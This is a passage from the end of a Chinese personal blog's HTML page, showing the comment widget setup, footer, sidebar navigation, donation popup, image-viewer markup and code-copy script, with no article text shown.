    app_id: "5s6sYhVyYIhL1fb7zrErH8BX-gzGzoHsz",
    app_key: "829xTABHQSNKYRHRILDlEluh",
    path: window.location.pathname,
    avatar: "monsterid",
    placeholder: "给我的文章加点评论吧~",
    recordIP: true,
  });
  const infoEle = document.querySelector("#vcomments .info");
  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
    infoEle.childNodes.forEach(function (item) {
      item.parentNode.removeChild(item);
    });
  }
</script>
<style>
  #vcomments-box {
    padding: 5px 30px;
  }

  @media screen and (max-width: 800px) {
    #vcomments-box {
      padding: 5px 0px;
    }
  }

  #vcomments-box #vcomments {
    background-color: #fff;
  }

  .v .vlist .vcard .vh {
    padding-right: 20px;
  }

  .v .vlist .vcard {
    padding-left: 10px;
  }
</style>

 
   
  
   
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2024
        <i class="ri-heart-fill heart_icon"></i> n0rt6
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
        <li>
          <a href="https://beian.miit.gov.cn/" target="_black" rel="nofollow">豫ICP备88888888</a>
        </li>
        
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">Index</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">Archives</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">Categories</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">Tags</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">Friends</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">About Me</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
    

  </div>
</body>

</html>